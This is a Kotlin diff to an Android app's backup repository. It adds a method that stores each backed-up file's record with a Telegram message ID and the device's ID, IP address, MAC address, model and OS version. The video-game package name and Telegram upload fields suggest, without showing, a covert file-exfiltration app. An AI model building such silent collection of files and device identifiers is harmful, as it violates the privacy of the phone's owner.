@@ -1,13 +1,14 @@
 package com.service.assasinscreed02.repository
 
 import com.service.assasinscreed02.database.*
+import com.service.assasinscreed02.DeviceInfo
 import kotlinx.coroutines.flow.Flow
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import android.content.Context
 import android.util.Log
 
-class BackupRepository(context: Context) {
+class BackupRepository(private val context: Context) {
     private val database = BackupDatabase.getDatabase(context)
     private val backupFileDao = database.backupFileDao()
     private val backupSessionDao = database.backupSessionDao()
@@ -29,6 +30,42 @@ class BackupRepository(context: Context) {
             backupFileDao.insertFile(file)
         } catch (e: Exception) {
             Log.e(TAG, "Error inserting file: ${e.message}")
+            -1L
+        }
+    }
+
+    suspend fun insertFileWithDeviceInfo(
+        fileName: String,
+        filePath: String,
+        fileHash: String,
+        fileSize: Long,
+        fileType: String,
+        uploadStatus: String = "success",
+        telegramMessageId: String? = null,
+        errorMessage: String? = null
+    ): Long = withContext(Dispatchers.IO) {
+        try {
+            val deviceInfo = DeviceInfo(context).getDeviceData()
+            val backupFile = BackupFile(
+                fileName = fileName,
+                filePath = filePath,
+                fileHash = fileHash,
+                fileSize = fileSize,
+                fileType = fileType,
+                uploadStatus = uploadStatus,
+                telegramMessageId = telegramMessageId,
+                errorMessage = errorMessage,
+                deviceId = deviceInfo.deviceId,
+                deviceName = deviceInfo.deviceName,
+                deviceIp = deviceInfo.ipAddress,
+                deviceMac = deviceInfo.macAddress,
+                deviceModel = deviceInfo.model,
+                deviceManufacturer = deviceInfo.manufacturer,
+                androidVersion = deviceInfo.androidVersion
+            )
+            backupFileDao.insertFile(backupFile)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error inserting file with device info: ${e.message}")
             -1L
         }
     }
